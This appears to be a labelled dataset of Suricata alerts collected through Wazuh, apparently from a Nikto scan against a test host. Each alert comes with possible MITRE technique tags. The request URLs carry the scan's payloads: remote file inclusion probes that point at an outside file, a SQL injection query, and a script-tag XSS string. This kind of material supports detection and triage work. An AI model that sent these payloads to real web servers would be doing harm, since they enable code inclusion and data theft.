timestamp,alert,description,real_ttps,possible_ttps
2025-09-24T07:49:03.077+0000,"{""timestamp"": ""2025-09-24T07:49:03.077+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS SERWeb main_prepend.php functionsdir Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 550, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700143.6618153"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.509572+0000"", ""flow_id"": ""2151119914735024.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38806"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:2s0g7iU6PPtorVkUBsPtfLncTOw="", ""tx_id"": ""97"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010125"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS SERWeb main_prepend.php functionsdir Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/main_prepend.php?_SERWEB[functionsdir]=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005305)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""102"", ""pkts_toclient"": ""110"", ""bytes_toserver"": ""26542"", ""bytes_toclient"": ""46070"", ""start"": ""2025-09-24T07:48:51.398768+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS SERWeb main_prepend.php functionsdir Parameter Remote File Inclusion,[],['T1595.002']
2025-09-24T07:49:03.180+0000,"{""timestamp"": ""2025-09-24T07:49:03.180+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS MAXcms fm_includes_special Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 551, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700143.6620901"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.537105+0000"", ""flow_id"": ""778272273322732.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38816"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:3iGbEsK2Yf+n/b7YFUP2457KzRs="", ""tx_id"": ""21"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2011259"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS MAXcms fm_includes_special Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/microcms/includes/file_manager/special.php?fm_includes_special=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005330)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""26"", ""pkts_toclient"": ""40"", ""bytes_toserver"": ""6248"", ""bytes_toclient"": ""11361"", ""start"": ""2025-09-24T07:48:51.512748+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS MAXcms fm_includes_special Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-09-24T07:49:04.081+0000,"{""timestamp"": ""2025-09-24T07:49:04.081+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - SURICATA Applayer Detect protocol only one direction"", ""id"": ""86601"", ""firedtimes"": 561, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700144.6647127"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:52.710304+0000"", ""flow_id"": ""491119349912792.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38960"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""metadata"": {""flowints"": {""applayer"": {""anomaly"": {""count"": ""1""}}}}, ""community_id"": ""1:V1k8WwdsaTJb5561dD4vUQa4kEI="", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2260002"", ""rev"": ""1"", ""signature"": ""SURICATA Applayer Detect protocol only one direction"", ""category"": ""Generic Protocol Command Decode"", ""severity"": ""3""}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006433)"", ""http_content_type"": ""text/html"", ""http_method"": ""<script>alert(1)</script>"", ""protocol"": ""HTTP/1.1"", ""status"": ""400"", ""length"": ""226""}, ""app_proto"": ""http"", ""app_proto_ts"": ""failed"", ""flow"": {""pkts_toserver"": ""4"", ""pkts_toclient"": ""4"", ""bytes_toserver"": ""433"", ""bytes_toclient"": ""664"", ""start"": ""2025-09-24T07:48:52.709848+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - SURICATA Applayer Detect protocol only one direction,[],['T1595.002']
2025-09-24T07:49:49.400+0000,"{""timestamp"": ""2025-09-24T07:49:49.400+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SERVER Possible Cherokee Web Server GET AUX Request Denial Of Service Attempt"", ""id"": ""86601"", ""firedtimes"": 806, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700189.9653011"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:49:38.912325+0000"", ""flow_id"": ""684719298742284.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""56124"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""metadata"": {""flowints"": {""http"": {""anomaly"": {""count"": ""3""}}}}, ""community_id"": ""1:Tmq17sPJBWTWJBqCKIp0tt4kcfM="", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010229"", ""rev"": ""4"", ""signature"": ""ET WEB_SERVER Possible Cherokee Web Server GET AUX Request Denial Of Service Attempt"", ""category"": ""Attempted Denial of Service"", ""severity"": ""2"", ""metadata"": {""confidence"": [""Medium""], ""created_at"": [""2010_07_30""], ""signature_severity"": [""Unknown""], ""updated_at"": [""2019_09_27""]}}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""33"", ""pkts_toclient"": ""55"", ""bytes_toserver"": ""5756"", ""bytes_toclient"": ""14891"", ""start"": ""2025-09-24T07:49:38.559116+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SERVER Possible Cherokee Web Server GET AUX Request Denial Of Service Attempt,[],['T1595.003']
2025-09-24T07:49:51.137+0000,"{""timestamp"": ""2025-09-24T07:49:51.137+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - SURICATA STREAM 3way handshake wrong seq wrong ack"", ""id"": ""86601"", ""firedtimes"": 854, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700191.10195249"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:49:43.013264+0000"", ""flow_id"": ""784959540507588.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""172.17.100.121"", ""src_port"": ""80"", ""dest_ip"": ""192.42.1.174"", ""dest_port"": ""57186"", ""proto"": ""TCP"", ""community_id"": ""1:caH//JvYcUG3UkPHTyjO+5kG8ks="", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2210010"", ""rev"": ""2"", ""signature"": ""SURICATA STREAM 3way handshake wrong seq wrong ack"", ""category"": ""Generic Protocol Command Decode"", ""severity"": ""3""}, ""flow"": {""pkts_toserver"": ""1"", ""pkts_toclient"": ""2"", ""bytes_toserver"": ""74"", ""bytes_toclient"": ""481"", ""start"": ""2025-09-24T07:49:39.603076+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - SURICATA STREAM 3way handshake wrong seq wrong ack,[],['T1595.003']
2025-09-24T09:01:37.834+0000,"{""timestamp"": ""2025-09-24T09:01:37.834+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - GPL WEB_SERVER Oracle Java Process Manager access"", ""id"": ""86601"", ""firedtimes"": 485, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758704497.6409537"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T09:01:26.809155+0000"", ""flow_id"": ""27666894213269.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""44534"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:WvCt23eJZrRMjJwiJe8Vke7mInI="", ""tx_id"": ""32"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2101874"", ""rev"": ""6"", ""signature"": ""GPL WEB_SERVER Oracle Java Process Manager access"", ""category"": ""access to a potentially vulnerable web application"", ""severity"": ""2"", ""metadata"": {""created_at"": [""2010_09_23""], ""signature_severity"": [""Unknown""], ""updated_at"": [""2020_04_20""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/oprocmgr-status"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002795)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""37"", ""pkts_toclient"": ""45"", ""bytes_toserver"": ""7912"", ""bytes_toclient"": ""16047"", ""start"": ""2025-09-24T09:01:26.774293+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - GPL WEB_SERVER Oracle Java Process Manager access,[],['T1595.002']
2025-09-24T09:01:37.901+0000,"{""timestamp"": ""2025-09-24T09:01:37.901+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SERVER SELECT USER SQL Injection Attempt in URI"", ""id"": ""86601"", ""firedtimes"": 486, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758704497.6431431"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T09:01:26.827247+0000"", ""flow_id"": ""27666894213269.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""44534"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:WvCt23eJZrRMjJwiJe8Vke7mInI="", ""tx_id"": ""48"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010963"", ""rev"": ""7"", ""signature"": ""ET WEB_SERVER SELECT USER SQL Injection Attempt in URI"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""affected_product"": [""Web_Server_Applications""], ""attack_target"": [""Web_Server""], ""created_at"": [""2010_07_30""], ""deployment"": [""Datacenter""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""tag"": [""SQL_Injection""], ""updated_at"": [""2020_08_20""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/xsql/demo/adhocsql/query.xsql?sql=select%20username%20from%20ALL_USERS"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002811)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""53"", ""pkts_toclient"": ""61"", ""bytes_toserver"": ""11580"", ""bytes_toclient"": ""23439"", ""start"": ""2025-09-24T09:01:26.774293+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SERVER SELECT USER SQL Injection Attempt in URI,[],['T1595.002']
2025-09-24T09:01:40.622+0000,"{""timestamp"": ""2025-09-24T09:01:40.622+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS PHP-Paid4Mail RFI attempt"", ""id"": ""86601"", ""firedtimes"": 539, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758704500.7252222"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T09:01:29.539257+0000"", ""flow_id"": ""1179267885547453.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""44344"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:MBzAIJwh4pb+hTbJEddQqzdX/FE="", ""tx_id"": ""23"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009892"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS PHP-Paid4Mail RFI attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/home.php?page=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004834)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""28"", ""pkts_toclient"": ""34"", ""bytes_toserver"": ""6692"", ""bytes_toclient"": ""11757"", ""start"": ""2025-09-24T09:01:29.507837+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS PHP-Paid4Mail RFI attempt,[],['T1595.002']
2025-09-24T06:19:43.937+0000,"{""timestamp"": ""2025-09-24T06:19:43.937+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS ProdLer prodler.class.php sPath Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 608, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758694783.7401345"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T06:19:31.943987+0000"", ""flow_id"": ""1847044468871654.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""33014"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:Aj8LdHGJtJU2smDll1ozmZQRjD0="", ""tx_id"": ""44"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010276"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS ProdLer prodler.class.php sPath Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/include/prodler.class.php?sPath=http://cirt.net/rfiinc.txt????"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004959)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""49"", ""pkts_toclient"": ""59"", ""bytes_toserver"": ""12586"", ""bytes_toclient"": ""21723"", ""start"": ""2025-09-24T06:19:31.889318+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS ProdLer prodler.class.php sPath Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-09-24T06:19:44.019+0000,"{""timestamp"": ""2025-09-24T06:19:44.019+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS PointComma pctemplate.php pcConfig Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 609, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758694784.7404090"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T06:19:31.964439+0000"", ""flow_id"": ""1847044468871654.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""33014"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:Aj8LdHGJtJU2smDll1ozmZQRjD0="", ""tx_id"": ""63"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010466"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS PointComma pctemplate.php pcConfig Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/includes/classes/pctemplate.php?pcConfig[smartyPath]=http://cirt.net/rfiinc.txt??cmd"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004978)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""68"", ""pkts_toclient"": ""78"", ""bytes_toserver"": ""17819"", ""bytes_toclient"": ""30501"", ""start"": ""2025-09-24T06:19:31.889318+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS PointComma pctemplate.php pcConfig Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-09-24T06:19:44.349+0000,"{""timestamp"": ""2025-09-24T06:19:44.349+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SERVER PHP REQUEST SuperGlobal in URI"", ""id"": ""86601"", ""firedtimes"": 610, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758694784.7406888"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T06:19:32.048908+0000"", ""flow_id"": ""1322732041277297.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""33016"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:jC1zKuqg+PtHhyj3YtCCjU+chUU="", ""tx_id"": ""41"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2017441"", ""rev"": ""4"", ""signature"": ""ET WEB_SERVER PHP REQUEST SuperGlobal in URI"", ""category"": ""Potentially Bad Traffic"", ""severity"": ""2"", ""metadata"": {""created_at"": [""2013_09_10""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_21""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005057)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""46"", ""pkts_toclient"": ""57"", ""bytes_toserver"": ""11977"", ""bytes_toclient"": ""20403"", ""start"": ""2025-09-24T06:19:32.003953+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SERVER PHP REQUEST SuperGlobal in URI,[],['T1595.002']
